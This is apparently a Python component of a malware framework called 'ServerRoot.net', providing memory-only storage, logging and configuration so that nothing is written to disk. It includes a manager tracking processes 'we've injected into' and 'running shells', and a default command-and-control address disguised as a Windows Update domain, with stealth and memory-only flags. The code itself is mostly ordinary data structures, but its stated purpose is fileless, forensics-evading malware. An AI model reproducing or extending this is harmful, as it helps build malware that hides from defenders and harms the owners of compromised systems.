"""
ServerRoot.net - Memory-Only Operations Module
Fileless operation, all data in RAM only
"""

import os
import sys
import json
import time
import uuid
from typing import Dict, List, Optional, Any, Tuple
import threading
import hashlib
from dataclasses import dataclass, field
from collections import deque


@dataclass
class MemoryFile:
    """
    Virtual file in memory (never touches disk)
    """
    name: str
    content: bytes
    created_at: float = field(default_factory=time.time)
    modified_at: float = field(default_factory=time.time)
    size: int = 0
    
    def __post_init__(self):
        self.size = len(self.content)
        self.modified_at = time.time()
    
    def read(self) -> bytes:
        return self.content
    
    def write(self, data: bytes):
        self.content = data
        self.size = len(data)
        self.modified_at = time.time()
    
    def append(self, data: bytes):
        self.content += data
        self.size = len(self.content)
        self.modified_at = time.time()
    
    def delete(self):
        self.content = b''
        self.size = 0
        self.modified_at = time.time()


class MemoryFileSystem:
    """
    In-memory file system
    All files exist only in RAM, never on disk
    """
    
    def __init__(self):
        self.files: Dict[str, MemoryFile] = {}
        self.lock = threading.Lock()
        self.max_memory = 100 * 1024 * 1024  # 100 MB limit
        self.current_memory = 0
    
    def create_file(self, name: str, content: bytes = b'') -> bool:
        """Create file in memory"""
        with self.lock:
            new_size = len(content)
            
            if self.current_memory + new_size > self.max_memory:
                return False
            
            if name in self.files:
                return False
            
            self.files[name] = MemoryFile(name, content)
            self.current_memory += new_size
            return True
    
    def read_file(self, name: str) -> Optional[bytes]:
        """Read file from memory"""
        with self.lock:
            if name in self.files:
                return self.files[name].read()
            return None
    
    def write_file(self, name: str, content: bytes) -> bool:
        """Write file to memory"""
        with self.lock:
            if name in self.files:
                old_size = self.files[name].size
                new_size = len(content)
                
                if self.current_memory - old_size + new_size > self.max_memory:
                    return False
                
                self.files[name].write(content)
                self.current_memory = self.current_memory - old_size + new_size
                return True
            else:
                return self.create_file(name, content)
    
    def delete_file(self, name: str) -> bool:
        """Delete file from memory"""
        with self.lock:
            if name in self.files:
                old_size = self.files[name].size
                del self.files[name]
                self.current_memory -= old_size
                return True
            return False
    
    def list_files(self) -> List[str]:
        """List all files in memory"""
        with self.lock:
            return list(self.files.keys())
    
    def file_exists(self, name: str) -> bool:
        """Check if file exists in memory"""
        with self.lock:
            return name in self.files
    
    def get_file_info(self, name: str) -> Optional[Dict]:
        """Get file information"""
        with self.lock:
            if name in self.files:
                f = self.files[name]
                return {
                    'name': f.name,
                    'size': f.size,
                    'created_at': f.created_at,
                    'modified_at': f.modified_at
                }
            return None
    
    def clear_all(self):
        """Clear all files from memory"""
        with self.lock:
            self.files.clear()
            self.current_memory = 0
    
    def get_memory_usage(self) -> Tuple[int, int]:
        """Get current memory usage and limit"""
        with self.lock:
            return self.current_memory, self.max_memory


class MemoryDataStore:
    """
    In-memory data store
    All data stored in RAM, never written to disk
    """
    
    def __init__(self):
        self.data: Dict[str, Any] = {}
        self.expiry: Dict[str, float] = {}
        self.lock = threading.Lock()
        self.cleanup_interval = 300  # 5 minutes
        self.default_ttl = 3600  # 1 hour
    
    def set(self, key: str, value: Any, ttl: Optional[int] = None) -> bool:
        """Store data in memory"""
        with self.lock:
            self.data[key] = value
            
            if ttl is not None:
                self.expiry[key] = time.time() + ttl
            elif key in self.expiry:
                del self.expiry[key]
            
            return True
    
    def get(self, key: str) -> Optional[Any]:
        """Retrieve data from memory"""
        with self.lock:
            if key not in self.data:
                return None
            
            if key in self.expiry and time.time() > self.expiry[key]:
                del self.data[key]
                del self.expiry[key]
                return None
            
            return self.data[key]
    
    def delete(self, key: str) -> bool:
        """Delete data from memory"""
        with self.lock:
            if key in self.data:
                del self.data[key]
                if key in self.expiry:
                    del self.expiry[key]
                return True
            return False
    
    def exists(self, key: str) -> bool:
        """Check if key exists"""
        with self.lock:
            if key in self.expiry and time.time() > self.expiry[key]:
                if key in self.data:
                    del self.data[key]
                if key in self.expiry:
                    del self.expiry[key]
                return False
            return key in self.data
    
    def clear(self):
        """Clear all data"""
        with self.lock:
            self.data.clear()
            self.expiry.clear()
    
    def cleanup_expired(self):
        """Remove expired entries"""
        current_time = time.time()
        with self.lock:
            expired_keys = [
                key for key, expiry in self.expiry.items()
                if current_time > expiry
            ]
            
            for key in expired_keys:
                if key in self.data:
                    del self.data[key]
                if key in self.expiry:
                    del self.expiry[key]
    
    def list_keys(self) -> List[str]:
        """List all keys"""
        with self.lock:
            self.cleanup_expired()
            return list(self.data.keys())
    
    def get_stats(self) -> Dict:
        """Get store statistics"""
        with self.lock:
            self.cleanup_expired()
            return {
                'total_keys': len(self.data),
                'keys_with_expiry': len(self.expiry),
                'memory_usage': sys.getsizeof(self.data) + sys.getsizeof(self.expiry)
            }


class MemoryLogger:
    """
    In-memory logger
    All logs in RAM, never written to disk
    """
    
    def __init__(self, max_entries: int = 1000):
        self.logs: deque = deque(maxlen=max_entries)
        self.lock = threading.Lock()
    
    def log(self, level: str, message: str, extra: Optional[Dict] = None):
        """Add log entry in memory"""
        entry = {
            'timestamp': time.time(),
            'level': level,
            'message': message,
            'extra': extra or {}
        }
        
        with self.lock:
            self.logs.append(entry)
    
    def info(self, message: str, extra: Optional[Dict] = None):
        self.log('INFO', message, extra)
    
    def warning(self, message: str, extra: Optional[Dict] = None):
        self.log('WARNING', message, extra)
    
    def error(self, message: str, extra: Optional[Dict] = None):
        self.log('ERROR', message, extra)
    
    def get_logs(self, level: Optional[str] = None, 
                limit: Optional[int] = None) -> List[Dict]:
        """Retrieve logs"""
        with self.lock:
            logs = list(self.logs)
            
            if level:
                logs = [log for log in logs if log['level'] == level]
            
            if limit:
                logs = logs[-limit:]
            
            return logs
    
    def clear_logs(self):
        """Clear all logs"""
        with self.lock:
            self.logs.clear()
    
    def export_logs(self) -> str:
        """Export logs as JSON (in memory only)"""
        with self.lock:
            return json.dumps(list(self.logs), indent=2)


class MemoryProcessManager:
    """
    In-memory process management
    Track injection targets and running shells
    """
    
    def __init__(self):
        self.injected_processes: Dict[int, Dict] = {}
        self.lock = threading.Lock()
    
    def register_injected_process(self, pid: int, process_info: Dict) -> bool:
        """Register a process we've injected into"""
        with self.lock:
            if pid not in self.injected_processes:
                self.injected_processes[pid] = process_info
                return True
            return False
    
    def unregister_process(self, pid: int) -> bool:
        """Unregister process"""
        with self.lock:
            if pid in self.injected_processes:
                del self.injected_processes[pid]
                return True
            return False
    
    def get_process_info(self, pid: int) -> Optional[Dict]:
        """Get process information"""
        with self.lock:
            return self.injected_processes.get(pid)
    
    def list_processes(self) -> List[int]:
        """List all injected processes"""
        with self.lock:
            return list(self.injected_processes.keys())
    
    def is_injected(self, pid: int) -> bool:
        """Check if process is injected"""
        with self.lock:
            return pid in self.injected_processes


class MemoryConfiguration:
    """
    Configuration stored in memory (no config files)
    """
    
    def __init__(self):
        self.config: Dict[str, Any] = {}
        self.lock = threading.Lock()
    
    def load_from_env(self):
        """Load configuration from environment variables"""
        with self.lock:
            env_config = {
                'c2_url': os.environ.get('SERVERROOT_C2_URL', 'windowsupdate.microsoft.com'),
                'encryption_key': os.environ.get('SERVERROOT_KEY', ''),
                'update_interval': int(os.environ.get('SERVERROOT_INTERVAL', '21600')),
                'stealth_mode': os.environ.get('SERVERROOT_STEALTH', 'true').lower() == 'true',
                'memory_only': os.environ.get('SERVERROOT_MEMORY_ONLY', 'true').lower() == 'true',
            }
            self.config.update(env_config)
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value"""
        with self.lock:
            return self.config.get(key, default)
    
    def set(self, key: str, value: Any) -> bool:
        """Set configuration value"""
        with self.lock:
            self.config[key] = value
            return True
    
    def get_all(self) -> Dict[str, Any]:
        """Get all configuration"""
        with self.lock:
            return self.config.copy()
    
    def get_hash(self) -> str:
        """Get hash of configuration (for integrity)"""
        with self.lock:
            config_str = json.dumps(self.config, sort_keys=True)
            return hashlib.sha256(config_str.encode()).hexdigest()


def create_memory_filesystem() -> MemoryFileSystem:
    """Create memory file system instance"""
    return MemoryFileSystem()


def create_memory_datastore() -> MemoryDataStore:
    """Create memory data store instance"""
    return MemoryDataStore()


def create_memory_logger(max_entries: int = 1000) -> MemoryLogger:
    """Create memory logger instance"""
    return MemoryLogger(max_entries)


def create_memory_process_manager() -> MemoryProcessManager:
    """Create memory process manager instance"""
    return MemoryProcessManager()


def create_memory_configuration() -> MemoryConfiguration:
    """Create memory configuration instance"""
    config = MemoryConfiguration()
    config.load_from_env()
    return config


if __name__ == '__main__':
    print("[MemoryOperations] Testing memory-only operations...\n")
    
    # Test Memory File System
    print("[TEST 1] Memory File System...")
    fs = create_memory_filesystem()
    fs.create_file('test.txt', b'Hello, World!')
    print(f"File exists: {fs.file_exists('test.txt')}")
    print(f"File content: {fs.read_file('test.txt')}")
    memory, limit = fs.get_memory_usage()
    print(f"Memory usage: {memory}/{limit} bytes\n")
    
    # Test Memory Data Store
    print("[TEST 2] Memory Data Store...")
    store = create_memory_datastore()
    store.set('key1', 'value1')
    store.set('key2', {'nested': 'data'}, ttl=60)
    print(f"Key1: {store.get('key1')}")
    print(f"Key2: {store.get('key2')}")
    print(f"Stats: {store.get_stats()}\n")
    
    # Test Memory Logger
    print("[TEST 3] Memory Logger...")
    logger = create_memory_logger()
    logger.info("Test message")
    logger.warning("Warning message")
    logs = logger.get_logs()
    print(f"Log count: {len(logs)}")
    print(f"Last log: {logs[-1]}\n")
    
    # Test Memory Configuration
    print("[TEST 4] Memory Configuration...")
    config = create_memory_configuration()
    config.set('test_key', 'test_value')
    print(f"Config hash: {config.get_hash()}")
    print(f"All config: {config.get_all()}\n")
    
    print("[MemoryOperations] All tests completed!")
    print("All operations were memory-only - no files written to disk!")